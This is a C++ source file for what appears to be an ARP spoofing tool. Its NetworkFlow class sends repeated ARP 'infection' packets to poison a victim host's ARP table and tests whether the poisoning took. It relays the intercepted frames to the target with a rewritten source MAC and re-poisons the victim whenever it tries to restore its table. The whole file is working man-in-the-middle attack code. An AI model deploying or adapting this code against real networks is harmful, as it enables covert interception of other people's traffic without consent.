#include "pch.h"
#include "net/netflow.h"
#include "pstl/waithandle.h"
#include "service/runopt.h"


NetworkFlow::NetworkFlow(NetworkObject& sender, NetworkObject& target) :
		_sender(sender),
		_target(target),
		_timeout(RunOption::Global().Timeout.Get()),
		_token(true),
		_run(false)
{
}

bool NetworkFlow::InitializeComponents()
{
	auto ts = _sender.InitializeComponentsAsync();
	auto tt = _target.InitializeComponentsAsync();
	return ts.get() && tt.get();
}

std::future<bool> NetworkFlow::InitializeComponentsDeferred()
{
	return std::async(std::launch::deferred, &NetworkFlow::InitializeComponents, this);
}

std::future<bool> NetworkFlow::InitializeComponentsAsync()
{
	return std::async(std::launch::async, &NetworkFlow::InitializeComponents, this);
}

std::future<bool> NetworkFlow::Run()
{
	return std::async(std::launch::async, [this]()
	{
		auto targetIP = _target.IP.Get();
		auto selfMAC = MAC::Self();
		if (!selfMAC)
		{
			LOG(FAIL) << "could not retrieve MAC self";
			return false;
		}

		bool affect;
		int attempt = 0;
		do
		{
			if (RunOption::Global().CheckICMP.Get())
			{
				LOG(INFO) << "attempt to spoof ARP table of "
						  << static_cast<std::string_view>(_sender.IP.Get())
						  << " [" << attempt << "/5]";
				affect = _sender.InfectAsync(_target.IP.Get()).get();
				if (affect)
				{
					LOG(VERB) << "testing whether ARP modified";
					affect = _sender.InfectionTestAsync(targetIP, _timeout).get();
				}
				else
				{
					LOG(FAIL) << "could not infect "
							  << static_cast<std::string_view>(_sender.IP.Get());
				}

				if (affect)
				{
					LOG(NOTE) << "ARP table for "
							  << static_cast<std::string_view>(_sender.IP.Get())
							  << "has been infected";
				}
				else
				{
					LOG(WARN) << "failed to attempt spoof ARP table of "
							  << static_cast<std::string_view>(_sender.IP.Get());
				}
			}
			else
			{
				LOG(INFO) << "attempt to spoof ARP table of "
						  << static_cast<std::string_view>(_sender.IP.Get());
				affect = _sender.InfectAsync(_target.IP.Get()).get();
				if (affect)
				{
					LOG(INFO) << "ARP infection packet sent";
				}
				else
				{
					LOG(FAIL) << "could not infect "
							  << static_cast<std::string_view>(_sender.IP.Get());
				}
			}
		} while (!affect && attempt++ < 5);

		if (!affect)
		{
			LOG(FAIL) << "could not spoof ARP table of "
					  << static_cast<std::string_view>(_sender.IP.Get());
			return false;
		}

		return true;
	});
}

std::future<bool> NetworkFlow::Relay()
{
	return std::async(std::launch::async, [this]()
	{
		auto selfMAC = MAC::Self();
		if (!selfMAC)
		{
			LOG(FAIL) << "could not retrieve MAC self";
			return false;
		}

		NetworkObject::HandlerType relayer([selfMAC, this](const HeaderSet& hdr, const OctetStream& origin)
		{
			/*
			 * do NOT use as reference
			 * stream can be used at different handler
			 * (stream is unique object. if you )
			 */
			OctetStream data;
			data += origin;

			/*
			 * do NOT keep source MAC address
			 * keeping source MAC address may cause unintended CAM table modification
			 * */
			auto rawMAC = selfMAC.value().Raw.Get();
			_rt_memcpy(data.As<DTO(MAC)>(sizeof(DTO(MAC))), &rawMAC, sizeof(DTO(MAC)));

			_target.Send(std::move(data));

			/*
			 * Target --)        : Blabla
			 * Target --)        : Who has this IP?
			 * Target --> Sender : Do you have this IP/MAC?
			 * */
			if ((hdr.GetType() == HeaderSet::SpecialType::ARP &&
				 (hdr.GetARP().TargetIP.Get() == _target.IP.Get() ||
				  hdr.GetARP().TargetMAC.Get() == _target.MAC.Get())) ||
				hdr.GetEthernetHeader().Destination.Get() == MAC::Broadcast)
			{
				/* Sender attempt to recover ARP table => re-infect */
				_sender.InfectAsync(_target.IP.Get());
			}
		});
		_sender += relayer;

		return true;
	});
}

std::future<bool> NetworkFlow::Periodic(std::chrono::milliseconds period)
{
	return std::async(std::launch::async, [this, period]()
	{
		_run = true;

		_sender.InfectAsync(_target.IP.Get()).wait();

		auto stp = std::chrono::system_clock::now();
		for (; _token;)
		{
			auto etp = std::chrono::system_clock::now();
			if (std::chrono::duration_cast<std::chrono::milliseconds>(etp - stp) > period)
				break;
			sched_yield();
		}

		_run = false;

		return true;
	});
}

std::future_status NetworkFlow::Join(std::chrono::milliseconds timeout)
{
	return std::async(std::launch::async, [this]()
	{
		for (; _run;) sched_yield();
	}).wait_for(timeout);
}

void NetworkFlow::Stop()
{
	_token = false;
}
